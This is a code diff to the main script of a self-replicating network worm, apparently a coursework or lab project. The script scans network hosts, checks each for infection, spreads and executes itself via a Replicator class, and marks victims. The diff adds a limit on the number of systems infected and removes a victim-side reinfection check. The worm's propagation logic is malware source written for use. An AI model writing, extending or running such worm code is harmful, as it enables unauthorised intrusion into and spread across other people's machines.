@@ -4,6 +4,8 @@ from Replicator import Replicator
 
 DEBUG = True
 
+NUM_SYSTEMS_TO_INFECT = 1
+
 try:
 	dprint
 except:
@@ -40,13 +42,6 @@ def main(argv):
 
 		isHost = False
 
-		# TODO: If we are running on the victim, check if
-		# the victim was already infected. If so, terminate.
-		# Otherwise, proceed with malice.
-		if Replicator.isInfectedSystem():
-			dprint("Victim system is already infected. Terminate", DEBUG)
-			sys.exit(0)
-
 	if isHost:
 		Replicator.markAsHost()
 
@@ -64,6 +59,8 @@ def main(argv):
 		networkHosts.remove(currentIp)
 
 	dprint("Found hosts: %s" % str(networkHosts), DEBUG)
+
+	systemsInfected = 0
 
 	# Go through the network hosts
 	for host in networkHosts:
@@ -113,13 +110,17 @@ def main(argv):
 					dprint(host + " is not infected yet", DEBUG)
 					myReplicator.spreadAndExecute(isHost)
 					Replicator.markInfected()
+					systemsInfected += 1
 				else:
-					dprint(host + " is already infected yet", DEBUG)
+					dprint(host + " is already infected", DEBUG)
 			else:
 				dprint("Remote system is host, cancel the attack", DEBUG)
 
 
 			dprint("Spreading complete", DEBUG)
+
+			if systemsInfected == NUM_SYSTEMS_TO_INFECT:
+				break
 
 	dprint("Finished pwning...")
 	sys.exit(0)
